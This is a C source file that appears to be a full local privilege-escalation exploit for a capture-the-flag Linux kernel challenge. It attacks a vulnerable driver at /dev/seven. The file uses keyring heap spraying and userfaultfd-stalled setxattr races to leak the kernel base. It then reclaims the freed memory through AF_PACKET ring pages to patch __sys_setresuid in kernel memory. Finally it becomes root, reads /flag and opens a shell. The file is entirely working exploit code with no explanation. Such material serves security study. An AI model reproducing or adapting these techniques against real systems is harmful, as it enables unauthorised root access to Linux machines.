#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <linux/keyctl.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)


#define o(x) (kbase + x)

unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

void get_shell() {
    int uid;
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void saveStatus(void) {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_eflags;"
            );

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

void init_namespace(void) {
    int fd;
    char buff[0x100];

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        die("unshare(CLONE_NEWUSER | CLONE_NEWNS): %m");
    }

    if (unshare(CLONE_NEWNET)) {
        die("unshare(CLONE_NEWNET): %m");
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", uid);
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", gid);
    write(fd, buff, strlen(buff));
    close(fd);
}

// raw_packet
#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif

void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        die("setsockopt(PACKET_VERSION): %m");
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) {
        die("setsockopt(PACKET_RX_RING): %m");
    }
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        die("socket(AF_PACKET): %m");
    }

    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) {
        die("bind(AF_PACKET): %m");
    }

    return s;
}

int pagealloc_pad(int count, int size) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}

// keyring
// spray in 0x200
#define KEY_PAYLOAD_SIZE (0x100 + 1 - 24)

#define CORRUPT_SIZE (0x1000)
typedef int32_t key_serial_t;

static inline key_serial_t key_alloc(char* description, char* payload, int payload_len)
{
    return syscall(
        __NR_add_key,
        "user",
        description,
        payload,
        payload_len,
        KEY_SPEC_PROCESS_KEYRING
    );
}

static inline key_serial_t key_read(int key_id, char *retbuf, int retbuf_len)
{
    return syscall(
        __NR_keyctl,
        KEYCTL_READ,
        key_id,
        retbuf,
        retbuf_len
    );
}

static inline key_serial_t key_revoke(int key_id)
{
    return syscall(
        __NR_keyctl,
        KEYCTL_REVOKE,
        key_id,
        0,
        0,
        0
    );
}

void spray_keyring(key_serial_t *id_buffer, uint32_t spray_size) {
    char key_desc[0x20];
    char key_payload[KEY_PAYLOAD_SIZE + 1] = {0};

    for (uint32_t i = 0; i < spray_size; i++) {
        snprintf(key_desc, sizeof(key_desc), "spray_key_%d", i);
        memset(key_payload, 'A', KEY_PAYLOAD_SIZE);
        for (int j = 0; j < 3; j++) {
            // retry, after KEYCTL_REVOKE, the key is scheduled for garbage collection,
            //  so it is not freed immediately
            id_buffer[i] = key_alloc(key_desc, key_payload, strlen(key_payload));
            if (id_buffer[i] < 0) {
                usleep(100 * 1000); // 100ms
            } else {
                break;
            }
        }

        if (id_buffer[i] < 0) {
            die("add_key %d: %m", i);
        }
    }
}

int is_keyring_corrupted(key_serial_t *id_buffer, uint32_t id_buffer_size,
                         key_serial_t *corrupted_key_id) {
    uint8_t buffer[CORRUPT_SIZE] = {0};
    int32_t keylen;

    for (uint32_t i = 0; i < id_buffer_size; i++) {
        if (!id_buffer[i]) {
            continue;
        }

        keylen = key_read(id_buffer[i], (long)buffer, CORRUPT_SIZE);
        if (keylen < 0)
            die("keyctl: %m");

        if (keylen == CORRUPT_SIZE) {
            *corrupted_key_id = id_buffer[i];
            return 1;
        }
    }
    return 0;
}

uint64_t get_keyring_leak(key_serial_t id_buffer) {
    uint8_t buffer[CORRUPT_SIZE] = {0};
    int32_t keylen;

    keylen = key_read(id_buffer, (long)buffer, CORRUPT_SIZE);
    if (keylen < 0) {
        die("keyctl: %m");
    }

    if (keylen == CORRUPT_SIZE) {
        char *ptr = buffer;
        ptr += (128 - 24);
        while (ptr < (char *)buffer + CORRUPT_SIZE - 128) {
            if ((*(uint64_t *)(ptr + 0x18) == 0x4141414141414141) &&
                (*(uint64_t *)(ptr + 8) != 0)) {
                logi("find user_key_payload rcu.func!");
                return *(uint64_t *)(ptr + 8); // user_free_payload_rcu
            }
            ptr += 128;
        }
    }
    return 0;
}

void release_key(key_serial_t id_buffer) {
    if (id_buffer) {
        if (key_revoke(id_buffer) < 0) {
            die("keyctl(KEYCTL_REVOKE): %m");
        }
    }
}

void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    for (uint32_t i = 0; i < id_buffer_size; i++) {
        release_key(id_buffer[i]);
        id_buffer[i] = 0;
    }
}

#define PATCH_JNE_OFFSET 0xb8
size_t crypto_larval_destroy = 0x43e280;
size_t timer_expire_func = 0xabd380;
size_t sys_resuid = 0x86f20;

size_t kbase;
int fd;
char* setx_addr1;
char* setx_addr2;
key_serial_t corrupted_key_id;

#define SPRAY_KEYRING_SIZE 1
key_serial_t id_buffer[SPRAY_KEYRING_SIZE];

void seven_kmalloc(){
    ioctl(fd,0x5555,0);
}

void seven_kfree(){
    ioctl(fd,0x6666,0);
}

void RegisterUserfault(void *fault_page,void *handler)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        die("ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page;   
    ur.range.len   = PAGE_SIZE;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    
        die("ioctl-UFFDIO_REGISTER");
    int s = pthread_create(&thr, NULL,handler, (void*)uffd);
    if (s!=0)
        die("pthread_create");
}

void* userfaultfd_sleep20_handler(void* arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long) arg;
    struct pollfd pollfd;
    int nready;
    
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    printf("[+] in usefaultfd handler, i will sleep 20s\n");   
    sleep(20);
    printf("[+] sleep done\n");	
    if (nready != 1) die("Wrong poll return val");

    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0) die("msg err");

    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) die("mmap err");
    memset(page, 0, PAGE_SIZE);
    
    struct uffdio_copy uc;
    uc.src = (unsigned long) page;
    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    // puts("[+] leak handler done");
    return NULL;
}

void* userfaultfd_sleep3_handler(void* arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long) arg;
    struct pollfd pollfd;
    int nready;
    
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    printf("[+] in usefaultfd handler, i will sleep 3s\n");   
    sleep(3);
    printf("[+] sleep done\n");	
    if (nready != 1) die("Wrong poll return val");

    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0) die("msg err");

    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) die("mmap err");
    memset(page, 0, PAGE_SIZE);
    
    struct uffdio_copy uc;
    uc.src = (unsigned long) page;
    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    // puts("[+] leak handler done");
    return NULL;
}

void* setxattr_thread(void* addr_arg){
    setxattr("/exp", "pwn", addr_arg, 0x200, 0); 
    // syscall(__NR_setxattr, "/exp", "pwn", addr_arg, 0x200, 0);
    return 0;
}

void do_leak(){
    seven_kmalloc();
    seven_kfree();
    spray_keyring(id_buffer, SPRAY_KEYRING_SIZE);
    seven_kfree();
    pthread_t thr1;
    pthread_create(&thr1, NULL, setxattr_thread, setx_addr1+0x1000-0x150);         // kmalloc -> sleep(3) -> kfree
    sleep(1);

    logd("checking if keyring is corrupted ...");
    if (is_keyring_corrupted(id_buffer, SPRAY_KEYRING_SIZE, &corrupted_key_id)) {
        logi("found keyring %d is corrupted!", corrupted_key_id);
    } else {
        die("can't found corrupted keyring, retry ...");       
    }

    char *buffer = malloc(0x1000);
    memset(buffer, 0, 0x1000);
    int ret = key_read(corrupted_key_id, (long)buffer, CORRUPT_SIZE);

    int i;
    for(i = 0;i < 0x200; i++){
        uint64_t temp_value = *(uint64_t*)(buffer+i*8);
        if(((temp_value>>32) == 0xffffffff) && ((temp_value & 0xfff) == 0x280)){
            kbase = temp_value - crypto_larval_destroy;
            logi("kernel_base is: 0x%lx", kbase);
            break;
        }
    }

    if(i == 0x200){
        die("failed leak, reboot and try again!\n");
    }
}

void do_write_primitive(){
    // free: user_key_payload
    release_keys(id_buffer, SPRAY_KEYRING_SIZE);
    sleep(1);

    // malloc:  AF_PACKET
    int packet_fds = pagealloc_pad(33, 0x1000);
    logd("page alloc done!");
    sleep(1);

    for(int j = 0x150; j > 0x0; j = j-0x8){
        *(uint64_t*)(setx_addr2+0x1000-j) = o(sys_resuid) & ~0xfff;
    }

    *(uint64_t*)(setx_addr2+0x1000-0x150) = o(sys_resuid) & ~0xfff;
    pthread_t thr_sleep,thr_sleep2;
    pthread_create(&thr_sleep, NULL, setxattr_thread, setx_addr2+0x1000-0x150);
    sleep(1);
    pthread_create(&thr_sleep2, NULL, setxattr_thread, setx_addr2+0x1000-0x150);
    sleep(1);
    char *page = (char *)mmap(NULL, PAGE_SIZE * 33,
                                PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds, 0);
    hexdump(&page[(o(sys_resuid) + PATCH_JNE_OFFSET) & 0xfff], 0x100);

    logd("patching __sys_setresuid jne to jmp...");
    page[(o(sys_resuid) + PATCH_JNE_OFFSET) & 0xfff] = 0xeb;         // change if branch
}

int main()
{
    saveStatus();
    fd = open("/dev/seven", O_RDWR);
    if(fd < 0) perror("Error open");

    pid_t pid = fork();
    if (!pid) {
        logd("initialize exploit environment ...");
        init_namespace();
        setx_addr1 = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        RegisterUserfault(setx_addr1+0x1000, userfaultfd_sleep3_handler);

        setx_addr2 = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        RegisterUserfault(setx_addr2+0x1000, userfaultfd_sleep20_handler);
        *(uint64_t*)(setx_addr1+0x1000-0x150) = 0x11111111;
        *(uint64_t*)(setx_addr1+0x1000-0x148) = 0x22222222;
        *(uint64_t*)(setx_addr1+0x1000-0x140) = CORRUPT_SIZE;

        do_leak();

        do_write_primitive();
        pause();
    } else {
        sleep(8);
        char buf[50]= {0};
        logd("set resuid...");
        setresuid(0, 0, 0);
        logd("getuid: %d",getuid());
        logd("geteuid: %d",geteuid());
        int fd1 = open("/flag",0);
        logd("fd:%d",fd1);
        read(fd1,buf,0x20);
        logi("flag: %s",buf);
        system("/bin/sh");
    }

}